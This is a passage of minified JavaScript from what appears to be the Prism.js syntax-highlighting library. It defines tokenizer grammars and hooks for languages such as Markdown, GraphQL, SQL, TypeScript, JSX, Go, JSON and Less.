]+(?:"(?:\\.|[^"\\])*"|'(?:\\.|[^'\\])*'|\((?:\\.|[^)\\])*\)))?/,inside:{variable:{pattern:/^(!?\[)[^\]]+/,lookbehind:!0},string:/(?:"(?:\\.|[^"\\])*"|'(?:\\.|[^'\\])*'|\((?:\\.|[^)\\])*\))$/,punctuation:/^[\[\]!:]|[<>]/},alias:"url"},bold:{pattern:n(/\b__(?:(?!_)<inner>|_(?:(?!_)<inner>)+_)+__\b|\*\*(?:(?!\*)<inner>|\*(?:(?!\*)<inner>)+\*)+\*\*/.source),lookbehind:!0,greedy:!0,inside:{content:{pattern:/(^..)[\s\S]+(?=..$)/,lookbehind:!0,inside:{}},punctuation:/\*\*|__/}},italic:{pattern:n(/\b_(?:(?!_)<inner>|__(?:(?!_)<inner>)+__)+_\b|\*(?:(?!\*)<inner>|\*\*(?:(?!\*)<inner>)+\*\*)+\*/.source),lookbehind:!0,greedy:!0,inside:{content:{pattern:/(^.)[\s\S]+(?=.$)/,lookbehind:!0,inside:{}},punctuation:/[*_]/}},strike:{pattern:n(/(~~?)(?:(?!~)<inner>)+\2/.source),lookbehind:!0,greedy:!0,inside:{content:{pattern:/(^~~?)[\s\S]+(?=\1$)/,lookbehind:!0,inside:{}},punctuation:/~~?/}},"code-snippet":{pattern:/(^|[^\\`])(?:``[^`\r\n]+(?:`[^`\r\n]+)*``(?!`)|`[^`\r\n]+`(?!`))/,lookbehind:!0,greedy:!0,alias:["code","keyword"]},url:{pattern:n(/!?\[(?:(?!\])<inner>)+\](?:\([^\s)]+(?:[\t ]+"(?:\\.|[^"\\])*")?\)|[ \t]?\[(?:(?!\])<inner>)+\])/.source),lookbehind:!0,greedy:!0,inside:{operator:/^!/,content:{pattern:/(^\[)[^\]]+(?=\])/,lookbehind:!0,inside:{}},variable:{pattern:/(^\][ \t]?\[)[^\]]+(?=\]$)/,lookbehind:!0},url:{pattern:/(^\]\()[^\s)]+/,lookbehind:!0},string:{pattern:/(^[ \t]+)"(?:\\.|[^"\\])*"(?=\)$)/,lookbehind:!0}}}}),["url","bold","italic","strike"].forEach((function(t){["url","bold","italic","strike","code-snippet"].forEach((function(n){t!==n&&(e.languages.markdown[t].inside.content.inside[n]=e.languages.markdown[n])}))})),e.hooks.add("after-tokenize",(function(e){function t(e){if(e&&"string"!==typeof e)for(var n=0,a=e.length;n<a;n++){var r=e[n];if("code"===r.type){var l=r.content[1],o=r.content[3];if(l&&o&&"code-language"===l.type&&"code-block"===o.type&&"string"===typeof l.content){var i=l.content.replace(/\b#/g,"sharp").replace(/\b\+\+/g,"pp");i=(/[a-z][\w-]*/i.exec(i)||[""])[0].toLowerCase();var c="language-"+i;o.alias?"string"===typeof o.alias?o.alias=[o.alias,c]:o.alias.push(c):o.alias=[c]}}else t(r.content)}}"markdown"!==e.language&&"md"!==e.language||t(e.tokens)})),e.hooks.add("wrap",(function(t){if("code-block"===t.type){for(var n="",a=0,r=t.classes.length;a<r;a++){var l=t.classes[a],o=/language-(.+)/.exec(l);if(o){n=o[1];break}}var i=e.languages[n];if(i)t.content=e.highlight(s(t.content),i,n);else if(n&&"none"!==n&&e.plugins.autoloader){var c="md-"+(new Date).valueOf()+"-"+Math.floor(1e16*Math.random());t.attributes["id"]=c,e.plugins.autoloader.loadLanguages(n,(function(){var t=document.getElementById(c);t&&(t.innerHTML=e.highlight(t.textContent,e.languages[n],n))}))}}}));var o=RegExp(e.languages.markup.tag.pattern.source,"gi"),i={amp:"&",lt:"<",gt:">",quot:'"'},c=String.fromCodePoint||String.fromCharCode;function s(e){var t=e.replace(o,"");return t=t.replace(/&(\w{1,8}|#x?[\da-f]{1,8});/gi,(function(e,t){var n;if(t=t.toLowerCase(),"#"===t[0])return n="x"===t[1]?parseInt(t.slice(2),16):Number(t.slice(1)),c(n);var a=i[t];return a||e})),t}e.languages.md=e.languages.markdown}(o),o.languages.graphql={comment:/#.*/,description:{pattern:/(?:"""(?:[^"]|(?!""")")*"""|"(?:\\.|[^\\"\r\n])*")(?=\s*[a-z_])/i,greedy:!0,alias:"string",inside:{"language-markdown":{pattern:/(^"(?:"")?)(?!\1)[\s\S]+(?=\1$)/,lookbehind:!0,inside:o.languages.markdown}}},string:{pattern:/"""(?:[^"]|(?!""")")*"""|"(?:\\.|[^\\"\r\n])*"/,greedy:!0},number:/(?:\B-|\b)\d+(?:\.\d+)?(?:e[+-]?\d+)?\b/i,boolean:/\b(?:false|true)\b/,variable:/\$[a-z_]\w*/i,directive:{pattern:/@[a-z_]\w*/i,alias:"function"},"attr-name":{pattern:/\b[a-z_]\w*(?=\s*(?:\((?:[^()"]|"(?:\\.|[^\\"\r\n])*")*\))?:)/i,greedy:!0},"atom-input":{pattern:/\b[A-Z]\w*Input\b/,alias:"class-name"},scalar:/\b(?:Boolean|Float|ID|Int|String)\b/,constant:/\b[A-Z][A-Z_\d]*\b/,"class-name":{pattern:/(\b(?:enum|implements|interface|on|scalar|type|union)\s+|&\s*|:\s*|\[)[A-Z_]\w*/,lookbehind:!0},fragment:{pattern:/(\bfragment\s+|\.{3}\s*(?!on\b))[a-zA-Z_]\w*/,lookbehind:!0,alias:"function"},"definition-mutation":{pattern:/(\bmutation\s+)[a-zA-Z_]\w*/,lookbehind:!0,alias:"function"},"definition-query":{pattern:/(\bquery\s+)[a-zA-Z_]\w*/,lookbehind:!0,alias:"function"},keyword:/\b(?:directive|enum|extend|fragment|implements|input|interface|mutation|on|query|repeatable|scalar|schema|subscription|type|union)\b/,operator:/[!=|&]|\.{3}/,"property-query":/\w+(?=\s*\()/,object:/\w+(?=\s*\{)/,punctuation:/[!(){}\[\]:=,]/,property:/\w+/},o.hooks.add("after-tokenize",(function(e){if("graphql"===e.language)for(var t=e.tokens.filter((function(e){return"string"!==typeof e&&"comment"!==e.type&&"scalar"!==e.type})),n=0;n<t.length;){var a=t[n++];if("keyword"===a.type&&"mutation"===a.content){var r=[];if(d(["definition-mutation","punctuation"])&&"("===u(1).content){n+=2;var l=m(/^\($/,/^\)$/);if(-1===l)continue;for(;n<l;n++){var o=u(0);"variable"===o.type&&(p(o,"variable-input"),r.push(o.content))}n=l+1}if(d(["punctuation","property-query"])&&"{"===u(0).content&&(n++,p(u(0),"property-mutation"),r.length>0)){var i=m(/^\{$/,/^\}$/);if(-1===i)continue;for(var c=n;c<i;c++){var s=t[c];"variable"===s.type&&r.indexOf(s.content)>=0&&p(s,"variable-input")}}}}function u(e){return t[n+e]}function d(e,t){t=t||0;for(var n=0;n<e.length;n++){var a=u(n+t);if(!a||a.type!==e[n])return!1}return!0}function m(e,a){for(var r=1,l=n;l<t.length;l++){var o=t[l],i=o.content;if("punctuation"===o.type&&"string"===typeof i)if(e.test(i))r++;else if(a.test(i)&&(r--,0===r))return l}return-1}function p(e,t){var n=e.alias;n?Array.isArray(n)||(e.alias=n=[n]):e.alias=n=[],n.push(t)}})),o.languages.sql={comment:{pattern:/(^|[^\\])(?:\/\*[\s\S]*?\*\/|(?:--|\/\/|#).*)/,lookbehind:!0},variable:[{pattern:/@(["'`])(?:\\[\s\S]|(?!\1)[^\\])+\1/,greedy:!0},/@[\w.$]+/],string:{pattern:/(^|[^@\\])("|')(?:\\[\s\S]|(?!\2)[^\\]|\2\2)*\2/,greedy:!0,lookbehind:!0},identifier:{pattern:/(^|[^@\\])`(?:\\[\s\S]|[^`\\]|``)*`/,greedy:!0,lookbehind:!0,inside:{punctuation:/^`|`$/}},function:/\b(?:AVG|COUNT|FIRST|FORMAT|LAST|LCASE|LEN|MAX|MID|MIN|MOD|NOW|ROUND|SUM|UCASE)(?=\s*\()/i,keyword:/\b(?:ACTION|ADD|AFTER|ALGORITHM|ALL|ALTER|ANALYZE|ANY|APPLY|AS|ASC|AUTHORIZATION|AUTO_INCREMENT|BACKUP|BDB|BEGIN|BERKELEYDB|BIGINT|BINARY|BIT|BLOB|BOOL|BOOLEAN|BREAK|BROWSE|BTREE|BULK|BY|CALL|CASCADED?|CASE|CHAIN|CHAR(?:ACTER|SET)?|CHECK(?:POINT)?|CLOSE|CLUSTERED|COALESCE|COLLATE|COLUMNS?|COMMENT|COMMIT(?:TED)?|COMPUTE|CONNECT|CONSISTENT|CONSTRAINT|CONTAINS(?:TABLE)?|CONTINUE|CONVERT|CREATE|CROSS|CURRENT(?:_DATE|_TIME|_TIMESTAMP|_USER)?|CURSOR|CYCLE|DATA(?:BASES?)?|DATE(?:TIME)?|DAY|DBCC|DEALLOCATE|DEC|DECIMAL|DECLARE|DEFAULT|DEFINER|DELAYED|DELETE|DELIMITERS?|DENY|DESC|DESCRIBE|DETERMINISTIC|DISABLE|DISCARD|DISK|DISTINCT|DISTINCTROW|DISTRIBUTED|DO|DOUBLE|DROP|DUMMY|DUMP(?:FILE)?|DUPLICATE|ELSE(?:IF)?|ENABLE|ENCLOSED|END|ENGINE|ENUM|ERRLVL|ERRORS|ESCAPED?|EXCEPT|EXEC(?:UTE)?|EXISTS|EXIT|EXPLAIN|EXTENDED|FETCH|FIELDS|FILE|FILLFACTOR|FIRST|FIXED|FLOAT|FOLLOWING|FOR(?: EACH ROW)?|FORCE|FOREIGN|FREETEXT(?:TABLE)?|FROM|FULL|FUNCTION|GEOMETRY(?:COLLECTION)?|GLOBAL|GOTO|GRANT|GROUP|HANDLER|HASH|HAVING|HOLDLOCK|HOUR|IDENTITY(?:COL|_INSERT)?|IF|IGNORE|IMPORT|INDEX|INFILE|INNER|INNODB|INOUT|INSERT|INT|INTEGER|INTERSECT|INTERVAL|INTO|INVOKER|ISOLATION|ITERATE|JOIN|KEYS?|KILL|LANGUAGE|LAST|LEAVE|LEFT|LEVEL|LIMIT|LINENO|LINES|LINESTRING|LOAD|LOCAL|LOCK|LONG(?:BLOB|TEXT)|LOOP|MATCH(?:ED)?|MEDIUM(?:BLOB|INT|TEXT)|MERGE|MIDDLEINT|MINUTE|MODE|MODIFIES|MODIFY|MONTH|MULTI(?:LINESTRING|POINT|POLYGON)|NATIONAL|NATURAL|NCHAR|NEXT|NO|NONCLUSTERED|NULLIF|NUMERIC|OFF?|OFFSETS?|ON|OPEN(?:DATASOURCE|QUERY|ROWSET)?|OPTIMIZE|OPTION(?:ALLY)?|ORDER|OUT(?:ER|FILE)?|OVER|PARTIAL|PARTITION|PERCENT|PIVOT|PLAN|POINT|POLYGON|PRECEDING|PRECISION|PREPARE|PREV|PRIMARY|PRINT|PRIVILEGES|PROC(?:EDURE)?|PUBLIC|PURGE|QUICK|RAISERROR|READS?|REAL|RECONFIGURE|REFERENCES|RELEASE|RENAME|REPEAT(?:ABLE)?|REPLACE|REPLICATION|REQUIRE|RESIGNAL|RESTORE|RESTRICT|RETURN(?:ING|S)?|REVOKE|RIGHT|ROLLBACK|ROUTINE|ROW(?:COUNT|GUIDCOL|S)?|RTREE|RULE|SAVE(?:POINT)?|SCHEMA|SECOND|SELECT|SERIAL(?:IZABLE)?|SESSION(?:_USER)?|SET(?:USER)?|SHARE|SHOW|SHUTDOWN|SIMPLE|SMALLINT|SNAPSHOT|SOME|SONAME|SQL|START(?:ING)?|STATISTICS|STATUS|STRIPED|SYSTEM_USER|TABLES?|TABLESPACE|TEMP(?:ORARY|TABLE)?|TERMINATED|TEXT(?:SIZE)?|THEN|TIME(?:STAMP)?|TINY(?:BLOB|INT|TEXT)|TOP?|TRAN(?:SACTIONS?)?|TRIGGER|TRUNCATE|TSEQUAL|TYPES?|UNBOUNDED|UNCOMMITTED|UNDEFINED|UNION|UNIQUE|UNLOCK|UNPIVOT|UNSIGNED|UPDATE(?:TEXT)?|USAGE|USE|USER|USING|VALUES?|VAR(?:BINARY|CHAR|CHARACTER|YING)|VIEW|WAITFOR|WARNINGS|WHEN|WHERE|WHILE|WITH(?: ROLLUP|IN)?|WORK|WRITE(?:TEXT)?|YEAR)\b/i,boolean:/\b(?:FALSE|NULL|TRUE)\b/i,number:/\b0x[\da-f]+\b|\b\d+(?:\.\d*)?|\B\.\d+\b/i,operator:/[-+*\/=%^~]|&&?|\|\|?|!=?|<(?:=>?|<|>)?|>[>=]?|\b(?:AND|BETWEEN|DIV|ILIKE|IN|IS|LIKE|NOT|OR|REGEXP|RLIKE|SOUNDS LIKE|XOR)\b/i,punctuation:/[;[\]()`,.]/},function(e){var t=e.languages.javascript["template-string"],n=t.pattern.source,a=t.inside["interpolation"],r=a.inside["interpolation-punctuation"],l=a.pattern.source;function o(t,a){if(e.languages[t])return{pattern:RegExp("((?:"+a+")\\s*)"+n),lookbehind:!0,greedy:!0,inside:{"template-punctuation":{pattern:/^`|`$/,alias:"string"},"embedded-code":{pattern:/[\s\S]+/,alias:t}}}}function i(e,t){return"___"+t.toUpperCase()+"_"+e+"___"}function c(t,n,a){var r={code:t,grammar:n,language:a};return e.hooks.run("before-tokenize",r),r.tokens=e.tokenize(r.code,r.grammar),e.hooks.run("after-tokenize",r),r.tokens}function s(t){var n={};n["interpolation-punctuation"]=r;var l=e.tokenize(t,n);if(3===l.length){var o=[1,1];o.push.apply(o,c(l[1],e.languages.javascript,"javascript")),l.splice.apply(l,o)}return new e.Token("interpolation",l,a.alias,t)}function u(t,n,a){var r=e.tokenize(t,{interpolation:{pattern:RegExp(l),lookbehind:!0}}),o=0,u={},d=r.map((function(e){if("string"===typeof e)return e;var n,r=e.content;while(-1!==t.indexOf(n=i(o++,a)));return u[n]=r,n})).join(""),m=c(d,n,a),p=Object.keys(u);function h(e){for(var t=0;t<e.length;t++){if(o>=p.length)return;var n=e[t];if("string"===typeof n||"string"===typeof n.content){var a=p[o],r="string"===typeof n?n:n.content,l=r.indexOf(a);if(-1!==l){++o;var i=r.substring(0,l),c=s(u[a]),d=r.substring(l+a.length),m=[];if(i&&m.push(i),m.push(c),d){var g=[d];h(g),m.push.apply(m,g)}"string"===typeof n?(e.splice.apply(e,[t,1].concat(m)),t+=m.length-1):n.content=m}}else{var f=n.content;Array.isArray(f)?h(f):h([f])}}}return o=0,h(m),new e.Token(a,m,"language-"+a,t)}e.languages.javascript["template-string"]=[o("css",/\b(?:styled(?:\([^)]*\))?(?:\s*\.\s*\w+(?:\([^)]*\))*)*|css(?:\s*\.\s*(?:global|resolve))?|createGlobalStyle|keyframes)/.source),o("html",/\bhtml|\.\s*(?:inner|outer)HTML\s*\+?=/.source),o("svg",/\bsvg/.source),o("markdown",/\b(?:markdown|md)/.source),o("graphql",/\b(?:gql|graphql(?:\s*\.\s*experimental)?)/.source),o("sql",/\bsql/.source),t].filter(Boolean);var d={javascript:!0,js:!0,typescript:!0,ts:!0,jsx:!0,tsx:!0};function m(e){return"string"===typeof e?e:Array.isArray(e)?e.map(m).join(""):m(e.content)}e.hooks.add("after-tokenize",(function(t){function n(t){for(var a=0,r=t.length;a<r;a++){var l=t[a];if("string"!==typeof l){var o=l.content;if(Array.isArray(o))if("template-string"===l.type){var i=o[1];if(3===o.length&&"string"!==typeof i&&"embedded-code"===i.type){var c=m(i),s=i.alias,d=Array.isArray(s)?s[0]:s,p=e.languages[d];if(!p)continue;o[1]=u(c,p,d)}}else n(o);else"string"!==typeof o&&n([o])}}}t.language in d&&n(t.tokens)}))}(o),function(e){e.languages.typescript=e.languages.extend("javascript",{"class-name":{pattern:/(\b(?:class|extends|implements|instanceof|interface|new|type)\s+)(?!keyof\b)(?!\s)[_$a-zA-Z\xA0-\uFFFF](?:(?!\s)[$\w\xA0-\uFFFF])*(?:\s*<(?:[^<>]|<(?:[^<>]|<[^<>]*>)*>)*>)?/,lookbehind:!0,greedy:!0,inside:null},builtin:/\b(?:Array|Function|Promise|any|boolean|console|never|number|string|symbol|unknown)\b/}),e.languages.typescript.keyword.push(/\b(?:abstract|declare|is|keyof|readonly|require)\b/,/\b(?:asserts|infer|interface|module|namespace|type)\b(?=\s*(?:[{_$a-zA-Z\xA0-\uFFFF]|$))/,/\btype\b(?=\s*(?:[\{*]|$))/),delete e.languages.typescript["parameter"],delete e.languages.typescript["literal-property"];var t=e.languages.extend("typescript",{});delete t["class-name"],e.languages.typescript["class-name"].inside=t,e.languages.insertBefore("typescript","function",{decorator:{pattern:/@[$\w\xA0-\uFFFF]+/,inside:{at:{pattern:/^@/,alias:"operator"},function:/^[\s\S]+/}},"generic-function":{pattern:/#?(?!\s)[_$a-zA-Z\xA0-\uFFFF](?:(?!\s)[$\w\xA0-\uFFFF])*\s*<(?:[^<>]|<(?:[^<>]|<[^<>]*>)*>)*>(?=\s*\()/,greedy:!0,inside:{function:/^#?(?!\s)[_$a-zA-Z\xA0-\uFFFF](?:(?!\s)[$\w\xA0-\uFFFF])*/,generic:{pattern:/<[\s\S]+/,alias:"class-name",inside:t}}}}),e.languages.ts=e.languages.typescript}(o),function(e){function t(e,t){return RegExp(e.replace(/<ID>/g,(function(){return/(?!\s)[_$a-zA-Z\xA0-\uFFFF](?:(?!\s)[$\w\xA0-\uFFFF])*/.source})),t)}e.languages.insertBefore("javascript","function-variable",{"method-variable":{pattern:RegExp("(\\.\\s*)"+e.languages.javascript["function-variable"].pattern.source),lookbehind:!0,alias:["function-variable","method","function","property-access"]}}),e.languages.insertBefore("javascript","function",{method:{pattern:RegExp("(\\.\\s*)"+e.languages.javascript["function"].source),lookbehind:!0,alias:["function","property-access"]}}),e.languages.insertBefore("javascript","constant",{"known-class-name":[{pattern:/\b(?:(?:Float(?:32|64)|(?:Int|Uint)(?:8|16|32)|Uint8Clamped)?Array|ArrayBuffer|BigInt|Boolean|DataView|Date|Error|Function|Intl|JSON|(?:Weak)?(?:Map|Set)|Math|Number|Object|Promise|Proxy|Reflect|RegExp|String|Symbol|WebAssembly)\b/,alias:"class-name"},{pattern:/\b(?:[A-Z]\w*)Error\b/,alias:"class-name"}]}),e.languages.insertBefore("javascript","keyword",{imports:{pattern:t(/(\bimport\b\s*)(?:<ID>(?:\s*,\s*(?:\*\s*as\s+<ID>|\{[^{}]*\}))?|\*\s*as\s+<ID>|\{[^{}]*\})(?=\s*\bfrom\b)/.source),lookbehind:!0,inside:e.languages.javascript},exports:{pattern:t(/(\bexport\b\s*)(?:\*(?:\s*as\s+<ID>)?(?=\s*\bfrom\b)|\{[^{}]*\})/.source),lookbehind:!0,inside:e.languages.javascript}}),e.languages.javascript["keyword"].unshift({pattern:/\b(?:as|default|export|from|import)\b/,alias:"module"},{pattern:/\b(?:await|break|catch|continue|do|else|finally|for|if|return|switch|throw|try|while|yield)\b/,alias:"control-flow"},{pattern:/\bnull\b/,alias:["null","nil"]},{pattern:/\bundefined\b/,alias:"nil"}),e.languages.insertBefore("javascript","operator",{spread:{pattern:/\.{3}/,alias:"operator"},arrow:{pattern:/=>/,alias:"operator"}}),e.languages.insertBefore("javascript","punctuation",{"property-access":{pattern:t(/(\.\s*)#?<ID>/.source),lookbehind:!0},"maybe-class-name":{pattern:/(^|[^$\w\xA0-\uFFFF])[A-Z][$\w\xA0-\uFFFF]+/,lookbehind:!0},dom:{pattern:/\b(?:document|(?:local|session)Storage|location|navigator|performance|window)\b/,alias:"variable"},console:{pattern:/\bconsole(?=\s*\.)/,alias:"class-name"}});for(var n=["function","function-variable","method","method-variable","property-access"],a=0;a<n.length;a++){var r=n[a],l=e.languages.javascript[r];"RegExp"===e.util.type(l)&&(l=e.languages.javascript[r]={pattern:l});var o=l.inside||{};l.inside=o,o["maybe-class-name"]=/^[A-Z][\s\S]*/}}(o),function(e){var t=e.util.clone(e.languages.javascript),n=/(?:\s|\/\/.*(?!.)|\/\*(?:[^*]|\*(?!\/))\*\/)/.source,a=/(?:\{(?:\{(?:\{[^{}]*\}|[^{}])*\}|[^{}])*\})/.source,r=/(?:\{<S>*\.{3}(?:[^{}]|<BRACES>)*\})/.source;function l(e,t){return e=e.replace(/<S>/g,(function(){return n})).replace(/<BRACES>/g,(function(){return a})).replace(/<SPREAD>/g,(function(){return r})),RegExp(e,t)}r=l(r).source,e.languages.jsx=e.languages.extend("markup",t),e.languages.jsx.tag.pattern=l(/<\/?(?:[\w.:-]+(?:<S>+(?:[\w.:$-]+(?:=(?:"(?:\\[\s\S]|[^\\"])*"|'(?:\\[\s\S]|[^\\'])*'|[^\s{'"/>=]+|<BRACES>))?|<SPREAD>))*<S>*\/?)?>/.source),e.languages.jsx.tag.inside["tag"].pattern=/^<\/?[^\s>\/]*/,e.languages.jsx.tag.inside["attr-value"].pattern=/=(?!\{)(?:"(?:\\[\s\S]|[^\\"])*"|'(?:\\[\s\S]|[^\\'])*'|[^\s'">]+)/,e.languages.jsx.tag.inside["tag"].inside["class-name"]=/^[A-Z]\w*(?:\.[A-Z]\w*)*$/,e.languages.jsx.tag.inside["comment"]=t["comment"],e.languages.insertBefore("inside","attr-name",{spread:{pattern:l(/<SPREAD>/.source),inside:e.languages.jsx}},e.languages.jsx.tag),e.languages.insertBefore("inside","special-attr",{script:{pattern:l(/=<BRACES>/.source),alias:"language-javascript",inside:{"script-punctuation":{pattern:/^=(?=\{)/,alias:"punctuation"},rest:e.languages.jsx}}},e.languages.jsx.tag);var o=function e(t){return t?"string"===typeof t?t:"string"===typeof t.content?t.content:t.content.map(e).join(""):""},i=function t(n){for(var a=[],r=0;r<n.length;r++){var l=n[r],i=!1;if("string"!==typeof l&&("tag"===l.type&&l.content[0]&&"tag"===l.content[0].type?"</"===l.content[0].content[0].content?a.length>0&&a[a.length-1].tagName===o(l.content[0].content[1])&&a.pop():"/>"===l.content[l.content.length-1].content||a.push({tagName:o(l.content[0].content[1]),openedBraces:0}):a.length>0&&"punctuation"===l.type&&"{"===l.content?a[a.length-1].openedBraces++:a.length>0&&a[a.length-1].openedBraces>0&&"punctuation"===l.type&&"}"===l.content?a[a.length-1].openedBraces--:i=!0),(i||"string"===typeof l)&&a.length>0&&0===a[a.length-1].openedBraces){var c=o(l);r<n.length-1&&("string"===typeof n[r+1]||"plain-text"===n[r+1].type)&&(c+=o(n[r+1]),n.splice(r+1,1)),r>0&&("string"===typeof n[r-1]||"plain-text"===n[r-1].type)&&(c=o(n[r-1])+c,n.splice(r-1,1),r--),n[r]=new e.Token("plain-text",c,null,c)}l.content&&"string"!==typeof l.content&&t(l.content)}};e.hooks.add("after-tokenize",(function(e){"jsx"!==e.language&&"tsx"!==e.language||i(e.tokens)}))}(o),function(e){e.languages.diff={coord:[/^(?:\*{3}|-{3}|\+{3}).*$/m,/^@@.*@@$/m,/^\d.*$/m]};var t={"deleted-sign":"-","deleted-arrow":"<","inserted-sign":"+","inserted-arrow":">",unchanged:" ",diff:"!"};Object.keys(t).forEach((function(n){var a=t[n],r=[];/^\w+$/.test(n)||r.push(/\w+/.exec(n)[0]),"diff"===n&&r.push("bold"),e.languages.diff[n]={pattern:RegExp("^(?:["+a+"].*(?:\r\n?|\n|(?![\\s\\S])))+","m"),alias:r,inside:{line:{pattern:/(.)(?=[\s\S]).*(?:\r\n?|\n)?/,lookbehind:!0},prefix:{pattern:/[\s\S]/,alias:/\w+/.exec(n)[0]}}}})),Object.defineProperty(e.languages.diff,"PREFIXES",{value:t})}(o),o.languages.git={comment:/^#.*/m,deleted:/^[-\u2013].*/m,inserted:/^\+.*/m,string:/("|')(?:\\.|(?!\1)[^\\\r\n])*\1/,command:{pattern:/^.*\$ git .*$/m,inside:{parameter:/\s--?\w+/}},coord:/^@@.*@@$/m,"commit-sha1":/^commit \w{40}$/m},o.languages.go=o.languages.extend("clike",{string:{pattern:/(^|[^\\])"(?:\\.|[^"\\\r\n])*"|`[^`]*`/,lookbehind:!0,greedy:!0},keyword:/\b(?:break|case|chan|const|continue|default|defer|else|fallthrough|for|func|go(?:to)?|if|import|interface|map|package|range|return|select|struct|switch|type|var)\b/,boolean:/\b(?:_|false|iota|nil|true)\b/,number:[/\b0(?:b[01_]+|o[0-7_]+)i?\b/i,/\b0x(?:[a-f\d_]+(?:\.[a-f\d_]*)?|\.[a-f\d_]+)(?:p[+-]?\d+(?:_\d+)*)?i?(?!\w)/i,/(?:\b\d[\d_]*(?:\.[\d_]*)?|\B\.\d[\d_]*)(?:e[+-]?[\d_]+)?i?(?!\w)/i],operator:/[*\/%^!=]=?|\+[=+]?|-[=-]?|\|[=|]?|&(?:=|&|\^=?)?|>(?:>=?|=)?|<(?:<=?|=|-)?|:=|\.\.\./,builtin:/\b(?:append|bool|byte|cap|close|complex|complex(?:64|128)|copy|delete|error|float(?:32|64)|u?int(?:8|16|32|64)?|imag|len|make|new|panic|print(?:ln)?|real|recover|rune|string|uintptr)\b/}),o.languages.insertBefore("go","string",{char:{pattern:/'(?:\\.|[^'\\\r\n]){0,10}'/,greedy:!0}}),delete o.languages.go["class-name"],function(e){function t(e,t){return"___"+e.toUpperCase()+t+"___"}Object.defineProperties(e.languages["markup-templating"]={},{buildPlaceholders:{value:function(n,a,r,l){if(n.language===a){var o=n.tokenStack=[];n.code=n.code.replace(r,(function(e){if("function"===typeof l&&!l(e))return e;var r,i=o.length;while(-1!==n.code.indexOf(r=t(a,i)))++i;return o[i]=e,r})),n.grammar=e.languages.markup}}},tokenizePlaceholders:{value:function(n,a){if(n.language===a&&n.tokenStack){n.grammar=e.languages[a];var r=0,l=Object.keys(n.tokenStack);o(n.tokens)}function o(i){for(var c=0;c<i.length;c++){if(r>=l.length)break;var s=i[c];if("string"===typeof s||s.content&&"string"===typeof s.content){var u=l[r],d=n.tokenStack[u],m="string"===typeof s?s:s.content,p=t(a,u),h=m.indexOf(p);if(h>-1){++r;var g=m.substring(0,h),f=new e.Token(a,e.tokenize(d,n.grammar),"language-"+a,d),E=m.substring(h+p.length),b=[];g&&b.push.apply(b,o([g])),b.push(f),E&&b.push.apply(b,o([E])),"string"===typeof s?i.splice.apply(i,[c,1].concat(b)):s.content=b}}else s.content&&o(s.content)}return i}}}})}(o),function(e){e.languages.handlebars={comment:/\{\{![\s\S]*?\}\}/,delimiter:{pattern:/^\{\{\{?|\}\}\}?$/,alias:"punctuation"},string:/(["'])(?:\\.|(?!\1)[^\\\r\n])*\1/,number:/\b0x[\dA-Fa-f]+\b|(?:\b\d+(?:\.\d*)?|\B\.\d+)(?:[Ee][+-]?\d+)?/,boolean:/\b(?:false|true)\b/,block:{pattern:/^(\s*(?:~\s*)?)[#\/]\S+?(?=\s*(?:~\s*)?$|\s)/,lookbehind:!0,alias:"keyword"},brackets:{pattern:/\[[^\]]+\]/,inside:{punctuation:/\[|\]/,variable:/[\s\S]+/}},punctuation:/[!"#%&':()*+,.\/;<=>@\[\\\]^`{|}~]/,variable:/[^!"#%&'()*+,\/;<=>@\[\\\]^`{|}~\s]+/},e.hooks.add("before-tokenize",(function(t){var n=/\{\{\{[\s\S]+?\}\}\}|\{\{[\s\S]+?\}\}/g;e.languages["markup-templating"].buildPlaceholders(t,"handlebars",n)})),e.hooks.add("after-tokenize",(function(t){e.languages["markup-templating"].tokenizePlaceholders(t,"handlebars")})),e.languages.hbs=e.languages.handlebars}(o),o.languages.json={property:{pattern:/(^|[^\\])"(?:\\.|[^\\"\r\n])*"(?=\s*:)/,lookbehind:!0,greedy:!0},string:{pattern:/(^|[^\\])"(?:\\.|[^\\"\r\n])*"(?!\s*:)/,lookbehind:!0,greedy:!0},comment:{pattern:/\/\/.*|\/\*[\s\S]*?(?:\*\/|$)/,greedy:!0},number:/-?\b\d+(?:\.\d+)?(?:e[+-]?\d+)?\b/i,punctuation:/[{}[\],]/,operator:/:/,boolean:/\b(?:false|true)\b/,null:{pattern:/\bnull\b/,alias:"keyword"}},o.languages.webmanifest=o.languages.json,o.languages.less=o.languages.extend("css",{comment:[/\/\*[\s\S]*?\*\//,{pattern:/(^|[^\\])\/\/.*/,lookbehind:!0}],atrule:{pattern:/@[\w-](?:\((?:[^(){}]|\([^(){}]*\))*\)|[^(){};\s]|\s+(?!\s))*?(?=\s*\{)/,inside:{punctuation:/[:()]/}},selector:{pattern:/(?:@\{[\w-]+\}|[^{};\s@])(?:@\{[\w-]+\}|\((?:[^(){}]|\([^(){}]*\))*\)|[^(){};@\s]|\s+(?!\s))*?(?=\s*\{)/,inside:{variable:/@+[\w-]+/}},property:/(?:@\{[\w-]+\}|[\w-])+(?:\+_?)?(?=\s*:)/,operator:/[+\-*\/]/}),o.languages.insertBefore("less","property",{variable:[{pattern:/@[\w-]+\s*:/,inside:{punctuation:/:/}},/@@?[\w-]+/],"mixin-usage":{pattern:/([{;]\s*)[.#](?!\d)[\w-].*?(?=[(;])/,lookbehind:!0,alias:"function"}}),o.languages.makefile={comment:{pattern:/(^|[^\\])#(?:\\(?:\r\n|[\s\S])|[^\\\r\n])*/,lookbehind:!0},string:{pattern:/(["'])(?:\\(?:\r\n|[\s\S])|(?!\1)[^\\\r\n])*\1/,greedy:!0},"builtin-target":{pattern:/\.[A-Z][^:#=\s]+(?=\s*:(?!=))/,alias:"builtin"},target:{pattern:/^(?:[^:=\s]|[ \t]+(?![\s:]))+(?=\s*:(?!=))/m,alias:"symbol",inside:{variable:/\$+(?:(?!\$)[^(){}:#=\s]+|(?=[({]))/}},variable:/\$+(?:(?!\$)[^(){}:#=\s]+|\([@*%<^+?][DF]\)|(?=[({]))/,keyword:/-include\b|\b(?:define|else|endef|endif|export|ifn?def|ifn?eq|include|override|private|sinclude|undefine|unexport|vpath)\b/,function:{pattern:/(\()(?:abspath|addsuffix|and|basename|call|dir|error|eval|file|filter(?:-out)?|findstring|firstword|flavor|foreach|guile|if|info|join|lastword|load|notdir|or|origin|patsubst|realpath|shell|sort|strip|subst|suffix|value|warning|wildcard|word(?:list|s)?)(?=[ 